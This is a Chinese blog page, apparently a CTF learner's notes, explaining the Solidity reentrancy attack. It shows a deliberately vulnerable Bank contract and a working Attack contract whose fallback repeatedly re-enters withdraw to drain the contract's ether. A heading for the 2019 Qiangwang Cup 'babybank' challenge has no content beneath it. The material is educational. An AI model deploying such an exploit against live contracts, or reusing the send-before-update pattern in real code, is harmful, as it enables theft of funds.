<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>重入攻击 | Chen</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>重入攻击</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-05-06T13:09:58.000Z" id="date"> 2023-05-06</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-06T15:32:53.645Z" id="updated"> 2023-05-06</time></div></span><br><span>Word Count: <div class="control">599</div></span><br><span>Read Time: <div class="control">2 min</div></span></div></div><hr><div id="post-content"><h1 id="什么是重入攻击"><a href="#什么是重入攻击" class="headerlink" title="什么是重入攻击"></a>什么是重入攻击</h1><p>可以从字面意思来理解 所谓重入攻击就是多次调用造成的攻击 主要出现在哪一领域的合约呢 大部分都是涉及到存提款的</p>
<p>假如有一家银行 使用下面的合约来规定用户存取款</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.4;</span><br><span class="line"></span><br><span class="line">contract Bank&#123;</span><br><span class="line">    //地址=&gt;余额</span><br><span class="line">    mapping(address =&gt; uint) balance;</span><br><span class="line">    //充值</span><br><span class="line">    function deposit() public payable&#123;</span><br><span class="line">        balance[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    //提款msg.sender的全部ether</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(balance[msg.sender] &gt; 0);</span><br><span class="line">        //这里具有重入攻击的风险</span><br><span class="line">        (bool success,) = msg.sender.call&#123;value: balance[msg.sender]&#125;(&quot;&quot;);</span><br><span class="line">        require(success);</span><br><span class="line">        balance[msg.sender] = 0; </span><br><span class="line">    &#125;</span><br><span class="line">    //获取本合约的余额</span><br><span class="line">    function getBalance() public view returns(uint)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关注一下提款函数中的这一句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg.sender.call&#123;value: balance[msg.sender]&#125;(&quot;&quot;)</span><br></pre></td></tr></table></figure>

<p>balance[msg.sender]表示调用者的余额 其作为call函数的参数 用于向调用者发送以太币 在发送成功后 将调用者的以太币置零</p>
<p>看起来好像没什么问题 但是call函数本身是可以支持外部合约调用原合约代码的 </p>
<p>而在Solidity v0.6.0版本以上  solidity引入了recvive函数来接收以太币 如果一个合约没有recvive函数 那么fallback函数也可以 在v0.8.0及以上更高版本 取消了fallback函数</p>
<p>也就是说 如果攻击合约中 fallback函数再次调用了原合约中的withdraw取出余额 此时由于原合约还在执行call函数 调用者的余额还未清零 所以仍然可以执行withdraw 只有当预付的gas消耗完以后才会终止 这也就是重入攻击了</p>
<p>下面来看一下攻击合约如何编写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    Bank bank;</span><br><span class="line"></span><br><span class="line">    constructor(address _bank) payable&#123;</span><br><span class="line">        bank = Bank(_bank);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        if(bank.getBalance() &gt;= 1 ether)&#123;</span><br><span class="line">            bank.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable&#123;</span><br><span class="line">        bank.deposit&#123;value: 1 ether&#125;();</span><br><span class="line">        bank.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先调用desposit充值用户余额 此时用户余额大于0</p>
<p>调用withdraw函数 执行call函数 攻击合约中含有fallback 执行fallback接收以太币</p>
<p>fallback进行判断 如果用户余额大于等于1 就执行withdraw函数 如此反复循环 用户余额始终不会为0</p>
<p>知道原合约的gas消耗完 才正式结束</p>
<h1 id="真题分析"><a href="#真题分析" class="headerlink" title="真题分析"></a>真题分析</h1><h2 id="2019强网杯-babybank"><a href="#2019强网杯-babybank" class="headerlink" title="2019强网杯 babybank"></a>2019强网杯 babybank</h2><div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/05/06/DASCTF-Apr-2023-X-SU/">DASCTF Apr.2023 X SU Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305061934765.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Chen</a></h1><div id="description"><p>Dr.chen</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">1.</span> <span class="toc-text">什么是重入攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9C%9F%E9%A2%98%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">真题分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2019%E5%BC%BA%E7%BD%91%E6%9D%AF-babybank"><span class="toc-number">2.1.</span> <span class="toc-text">2019强网杯 babybank</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>